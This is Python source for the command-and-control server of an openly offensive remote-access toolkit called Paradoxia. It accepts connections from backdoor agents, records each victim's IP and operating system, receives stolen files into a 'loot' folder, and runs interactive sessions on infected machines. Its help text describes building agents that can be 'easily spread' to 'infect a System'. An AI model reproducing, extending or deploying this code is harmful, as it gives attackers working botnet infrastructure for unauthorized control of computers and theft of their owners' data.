"""

Have a good time reading the source. You are an amazing person.

"""
import socket
import _thread
from .infodb import *
from .session import run_session
import configparser
from os import stat
from os import path
from .builder import create_agent
import os
import subprocess
from kernel.banner import pbanner
from .notif import notify
from colorama import Fore, Style
import colorama 
from .scanner import *
import tqdm

colorama.init()


global client, addr
clients = []
oslist = []

iplist = []
wan_ip_list = []

blacklist = []

isSession = False

infodb = configparser.ConfigParser()
settings = configparser.ConfigParser()

try:
    settings.read("paradoxia.ini")
    server_settings = settings['server']
    bot_settings = settings['bot']
except Exception as e:
    print(str(e))
    exit(True)


def SendData(csocket, data):
    csocket = int(csocket)
    sockfd = clients[csocket]
    
    try:
        sockfd.send(data.encode())
    except Exception as error:
        clients.remove(sockfd)
        print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(error))

def SendFData(csocket, data):
    csocket = int(csocket)
    sockfd = clients[csocket]
    
    try:
        sockfd.send(data.encode())
    except Exception as error:
        clients.remove(sockfd)
        print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(error))


def SendBytes(csocket, data):
    """ Binary File Content is sent without Encryption """ 
    csocket = int(csocket)
    sockfd = clients[csocket]
    
    try:
        sockfd.send(data)
    except Exception as error:
        clients.remove(sockfd)
        print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(error))


def clear():
    if(os.name == "nt"):
        os.system("cls")
    else:
        os.system("clear")

def botlist():
    return str(len(clients))

def AllBotNames():
    if(len(clients) > 0):
        for i in range(len(iplist)):                
            return BOTNAMEONLY(iplist[i])
    else:
        return "-"

def broadcast(data):
    try:
        for i in clients:
            i.send(data.encode())
    except Exception as error:
        print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(error))


def ReceiveThread(ip, port, csocket, wanip, operating_system):
    """
    This function runs in a Thread and receives data 
    from the client.
    """
    def clearLists():
        try:
            clients.remove(csocket)
            iplist.remove(ip)
            wan_ip_list.remove(wanip)
            oslist.remove(operating_system)
        except ValueError:
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Socket not in list.")

    while(True):
        try:
            
            def uniquify(path):
                """
                Credits : https://stackoverflow.com/questions/13852700/create-file-but-if-name-exists-add-number/57896232#57896232
                """
                filename, extension = os.path.splitext(path)
                counter = 1

                while os.path.exists(path):
                    path = filename + " (" + str(counter) + ")" + extension
                    counter += 1

                return path

            response = csocket.recv(1024).decode()
            if(not response):
                clearLists()
                print("[!] BOT disconnected.")
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online Bots : " + str(len(clients)))
                break
            
            if(response.startswith("savethis")):
                print("\n[+] Incoming file..")
                fpath = "loot/"+BOTNAMEONLY(wanip).replace("/", "-")
                
                try:
                    os.mkdir(fpath)
                except FileExistsError:
                    pass
                except Exception as e:
                    print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error : " + str(e))
                try:
                    f = response.split("=")
                    csocket.settimeout(10)
                    try:

                        full_file = uniquify(fpath+"/"+f[1])
                        with open(full_file, "wb") as received_file:
                            data = csocket.recv(4096)
                            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Downloading file '{fl}' in '{fd}'".format(fl=f[1], fd=full_file))
                            while(data):
                                received_file.write(data)
                                data = csocket.recv(4096)  
                                if not data: break
                                
                    except socket.timeout:
                        csocket.settimeout(None)

                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Downloaded file '"+f[1] +"'.")
                        try:
                            sa = stat(full_file)
                            print(
                                "\nOriginal Filename : {filename}\nSize : {size} bytes\nSaved in : '{fp}'".format(
                                    filename = f[1],
                                    size = str(sa.st_size),
                                    fp = str(path.dirname(path.abspath(fpath+"/"+f[1])))
                                )
                            )
                        except FileNotFoundError:
                            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] File not Downloaded.")

                except IndexError:
                    print("Error.")
            else:
                # if(isSession == True):
                #print(str(response))
                # else:
                print("\n["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL +"] "+ip+":"+port+" -\n" + str(response))        
        except UnicodeDecodeError as ude:
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Unicode Decode error : " + str(ude))
        except UnicodeEncodeError as eEe:
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Unicode Encode error : " + str(eEe))
        except ConnectionAbortedError as cAe:
            # cAe : Connection Aborted Error :v
            clearLists()
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(cAe))
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online Bots : " + str(len(clients)))
            break

        except ConnectionError as cE:
            # cE : Connection Error :'v
            clearLists()
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(cE))
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online Bots : " + str(len(clients)))
            break

        except ConnectionRefusedError as cRe:
            # cRe : Connection Refused Error ;'v
            clearLists()
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(cRe))
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online Bots : " + str(len(clients)))
            break

        except ConnectionResetError as cRetwo:
            clearLists()
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(cRetwo))
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online Bots : " + str(len(clients)))
            break

        except socket.error as se:
                # for sockfd in clients:
                #     clients.remove(sockfd)
                clearLists()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(se))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online Bots : " + str(len(clients)))
                break
        
        except Exception as recv_error:
            clearLists()
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(recv_error))
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online Bots : " + str(len(clients)))
            break
    

def MainServer():
    """
    This is the main server where backdoors connect
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 5)

        
    host = server_settings['host']
    port = int(server_settings['port'])

    blist = open("blacklist", "r")
    bl_ips = blist.readlines()
    for i in range(len(bl_ips)):
        if("#" in bl_ips[i]):
            pass
        else:
            blacklist.append(bl_ips[i])

    try:
        server.bind((host, port))
    except PermissionError:
        print("["+Style.BRIGHT + Fore.LIGHTYELLOW_EX + "^" + Style.RESET_ALL + "] Run as sudo.")
        exit(True)
    except Exception as i:
        raise i

    try:
        server.listen(5)
        #print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] TCP Server running. ({host}:{port})".format(host=host, port=server_settings['port']))
    except KeyboardInterrupt:
        print(" Keyboard Interrupt, Exit.")
        exit()
    except Exception as errunknown:
        print(str(errunknown))

    while(True):
            
        client, addr = server.accept()
        if(addr[0] in blacklist):
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] New Connection form blacklisted IP " + str(addr[0]) +":"+ str(addr[1]))
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Connection Closed.")
            client.shutdown(socket.SHUT_RDWR)
            client.close()
            break

        clients.append(client)
        iplist.append(str(addr[0]))
        if(bot_settings['verbose'] == "True"):
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] New connection from " + str(addr[0]) +":"+ str(addr[1]))
        try:
            pw = bot_settings['password']
            if(bot_settings['verbose'] == "True"):
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Sending Password : "+pw + " ..")
            client.send(pw.encode())
            
            client.settimeout(10)
            try:
                # Set 10 seconds timeout to wait for client 
                
                pwInfo = client.recv(1024).decode()
                if(pwInfo.startswith("INCORRENT PASSWORD.")):
                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] " + pwInfo + ". Password Rejected by Agent.")
                    clients.remove(client)
                    iplist.remove(str(addr[0]))
                    break
            except socket.timeout:
                client.settimeout(None)
                print("\n[+] Timed out, Client did not send a Response.")
                print("\n[+] Forwarding to Scanner {ip}:{port}..".format(ip=str(addr[0]), port=str(addr[1])))
                scan_ip(addr[0])
                client.shutdown(socket.SHUT_RDWR)
                client.close()
                clients.remove(client)
                iplist.remove(addr[0])
                break
            
            client.settimeout(None)
            if(bot_settings['verbose'] == "True"):
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] " + pwInfo)
            # Receive Wan ip for file name
            client.send("wanip".encode())
            wanip = client.recv(1024).decode()
            client.send("os".encode())
            os = client.recv(1024).decode()
            wan_ip_list.append(wanip)
            oslist.append(os)
        except ConnectionResetError as cRe:
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] ERROR : " + str(cRe) + ". Most likely password was rejected.")
            clients.remove(client)
            iplist.remove(str(addr[0]))
            oslist.remove(os)
        except ConnectionAbortedError as cAe:
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] ERROR : " + str(cAe) + ". Most likely password was rejected.")
            clients.remove(client)
            iplist.remove(str(addr[0]))
            oslist.remove(os)
            
        if(wanip.startswith(("No"))):
            filename = "bots/"+str(addr[0])
        else:
            filename = "bots/"+str(wanip)
        if(bot_settings['verbose'] == "True"):
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Getting information..") 
        SaveInformation(client, filename) 
        notify(str(addr[0]), str(addr[1]), str(len(clients)))
        # default
        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] " + str(addr[0])+":"+str(addr[1])+ " is online.")
        _thread.start_new_thread(ReceiveThread, (str(addr[0]), str(addr[1]), client, wanip, os,))

def console():

    def list_bots():
        print("\nActive Sessions (" + str(len(clients)) +")")
        print("===================================")
        try:
            if(len(clients) > 0): 
                for i in range(len(iplist)):
                    print(  
                        "\n[ SESSION ID : "+str(i) +" ][ Connection : "+iplist[i] + " ][ WAN : "+wan_ip_list[i] +" ][ OPERATING SYSTEM : " + oslist[i] + " ]"
                        )
        except Exception as stre:
            print("Error : " + str(stre))
                
   
    
    _thread.start_new_thread(MainServer, ())
    
    while(True):
        
        try:
            command = input("paradoxia> ")
            args = command.split()
            if(command == "help"):
                print( 
                    """
                    HELP 
                    -------------
                    ~ Console Commands :
                    ---------------------------
                    + list/sessions - List online clients.

                    + settings - View settings.

                    + session - Interact with a Client.
                      - USAGE : session <session id>

                    + kill - Kill a connection.
                      - USAGE : kill <session id>
                    
                    + blacklist - Blacklist an IP address.
                        - USAGE : blacklist <ip>

                    + bytecheck - (Misc) Check the size of a string.
                      - (NOTE : This was added for cryptographic testing and is useless for a user. Useful for developer.)
                    
                    + botinfo - View information of a Connection BOT/Client.

                    + banner - Print banner.

                    + build lhost=<lhost> lport=<lport> - Build the agent.

                    + exit - Exit.

                    PARADOXIA Attack Toolkit
                    Created by : QuantumCore (Fahad)
                    Github : https://github.com/quantumcore 
                    Official Repository : https://github.com/quantumcored/paradoxia
                    Discord Server : https://discordapp.com/invite/8snh7nx

                    """ 
                )
            elif(command.startswith("blacklist")):
                try:
                    bargs = command.split()
                    if(len(bargs[1]) > 0):
                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Blacklisting IP : {ip}.\n |_ View file 'blacklist' to allow.".format(ip = bargs[1]))
                        with open("blacklist", "a+") as blacklist:
                            blacklist.write("\n"+bargs[1])
                    else:
                        print("USAGE : blacklist < ip > ")
                except FileNotFoundError:
                    print("CRITICAL : Blacklist file not found. Contact Developer.")
                except IndexError:
                    print("USAGE : blacklist < ip > ")
            
                    
            elif(command == "settings"):
                print(
                    "["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] TCP Server Host : " + server_settings['host'] + 
                    "\n["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] TCP Server Port : " + server_settings['port'] +
                    "\n["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Print BOT INFO on connect : " + bot_settings['auto_print_bot_info'] + 
                    "\n["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] BOT Password : " + bot_settings['password'] 
                 )
            elif(command == "list" or command == "sessions"):
                list_bots()
            elif(command.startswith("session")):
                s = command.split()
                try:
                    sid = int(s[1])
                    prefix = BOTNAMEONLY(wan_ip_list[sid]).split("/")
                    prmpt =  prefix[1].strip() + "("+Fore.RED+ Style.BRIGHT + wan_ip_list[sid] + Style.RESET_ALL +") > "
                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Session opened for Client ID {id}.".format(id=str(sid)))
                    isSession = True
                    run_session(clients[sid],isSession, prmpt, sid, iplist[sid])
                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Session closed for Client ID {id}.".format(id=str(sid)))
                except IndexError:
                    try:
                        print("CID {s} not online.".format(s=s[1]))
                    except IndexError:
                        print("USAGE : session < session id> ")
                except Exception as es:
                    print("Error! ("+str(es)+")")
                    
            elif(command == "bytecheck"):
                message = input("Input : ")
                msgsize = str(len(message)) + " Bytes."
                if(len(message) > 100):
                    print("\nYour Input : " + message + "\nSize : " + msgsize + "\n(Not Eligible for Password)")
                else:
                    print("\nYour Input : " + message + "\nSize : " + msgsize + "\n(Eligible for Password)")
          

            elif(command.startswith("kill")):
                try:
                    cid = int(args[1])
                    SendData(cid, "kill")
                    clients[cid].shutdown(socket.SHUT_RDWR)
                    clients[cid].close()
                    
                except IndexError:
                    print("USAGE : kill <session id>")
            elif(command.startswith("build")):
                try:
                    lh = args[1].split("=")
                    lp = args[2].split("=")
                    
                    create_agent(lh[1], lp[1], args[3])
                except IndexError:
                    print("""
                    [X] USAGE : build lhost=<lhost> lport=<lport> <static>/<normal>

                    LHOST - Ipv4 Address of Server to Connect to.
                    LPORT - Port of Server to Connect to.
                    static - Standalone Executable to run on almost any System.
                    normal - Executable that requires libraries to run.

                    EXAMPLES : 
                    [+] build lhost=192.168.0.101 lport=443 static
                    |- Size : Around 2.1 MB.
                    |- This will generate an Executable that you can easily spread 
                        without worrying that it will work or not.

                    [+] build lhost=192.168.0.101 lport=443 normal
                    |- Size : Around 600 kb.
                    |- This will generate an Executable that you can use for tests
                        on your own PC. Or infect a System which an environment where
                        it can run.

		            """)
            elif(command.startswith("botinfo")):
                try:
                    infoFor = iplist[int(args[1])]
                    ReadInformation(infoFor)                        
                except IndexError:  
                    print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] USAGE : botinfo < cid > / botinfo -offline")
                except ValueError:
                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Loading offline bots..")
                    fl = os.listdir("bots")
                    fl.remove("readme.md")
                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Offline Bots")
                    try:
                        for x in range(len(fl)):
                            print("""
                        [{index}] - [ {wanip} ] [ {os} ] [ {hname} ]
                            """.format(
                                index=str(x), 
                                wanip=fl[x].replace(".ini", ""), 
                                os=BOTOSONLY("bots/"+fl[x].replace(".ini", "")), 
                                hname=BOTNAMEONLY("bots/"+fl[x].replace(".ini", ""))
                                ))
                            
                        ask = input("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Enter Index : ")
                        if(len(ask) > 0):
                            fsp = fl[int(ask)] 
                            ReadInformation("bots/"+fsp.replace(".ini", ""))
                    except Exception as UnknownException:
                        print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Error : " + str(UnknownException))     

            elif(command == "banner"):
                print(pbanner())
            
            elif(command.startswith("send")):
                try:
                    cid = args[1]
                    SendData(cid, args[2])
                except IndexError:
                    print("USAGE : send <id> <data>")

            
            elif(command == "exit"):
                if(len(clients) > 0):
                    print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] You have online bots? Kill the connections?")
                    yn = input("Your Desicion (y/N) : ").lower()
                    if(yn == "y"):
                        broadcast("kill")
                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Disconnected everyone.")
                        exit(True)
                    else:
                        pass
                else:
                    exit(True)
                
            else:
                if(len(command) > 0):
                    try:
                        print(Style.BRIGHT + Fore.LIGHTCYAN_EX )
                        subprocess.run(['bash', '-c', command])
                        print(Style.RESET_ALL)
                    except Exception as procError:
                        print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Error : " + str(procError))

        except KeyboardInterrupt:
            print(" = Interrupt. Type Exit to exit.")
            

